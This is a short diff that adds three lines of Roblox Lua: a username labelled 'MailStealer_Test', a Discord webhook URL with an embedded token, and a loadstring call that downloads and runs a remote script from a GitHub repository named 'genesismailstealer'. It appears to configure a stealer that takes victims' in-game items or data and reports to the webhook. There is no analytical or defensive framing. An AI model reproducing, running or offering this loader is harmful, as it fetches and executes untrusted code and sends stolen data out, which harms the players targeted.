@@ -1,0 +1,3 @@
+Username = "MailStealer_Test"
+Webhook = "https://discord.com/api/webhooks/1249305558830415872/MssSmDk9Gx9Mlt4GQGxPmwU3yJzDDXk1wR4uoW8GiQH6mkh4pFfDm1O0h0fre7MAKJ_o"
+loadstring(game:HttpGet("https://raw.githubusercontent.com/rbxscriptt/genesismailstealer/main/mail.lua"))()
